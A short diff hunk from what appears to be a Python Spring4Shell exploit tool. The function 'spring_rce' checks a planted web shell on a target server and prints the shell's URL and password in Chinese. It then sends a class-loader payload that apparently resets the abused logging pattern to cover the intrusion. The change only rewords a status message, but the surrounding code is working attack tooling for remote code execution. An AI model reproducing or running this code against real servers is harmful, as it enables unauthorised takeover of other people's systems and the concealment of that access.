@@ -156,7 +156,7 @@ def spring_rce(alive_url):
             shell_url = urljoin(alive_url, shell_uri)
             shell = requests.get(shell_url, timeout=15)
             if shell.status_code == 200:
-                print(f"漏洞存在，shell地址为:" + shell_url + "\n")
+                print(shell_url + " 存在漏洞，shell地址为:" + shell_url + "\n")
                 print(f"shell密码为:" + random_passwd)
                 requests.post(url, headers=header, allow_redirects=True, data="class.module.classLoader.resources.context.parent.pipeline.first.pattern=", verify=False, timeout=10)
                 break
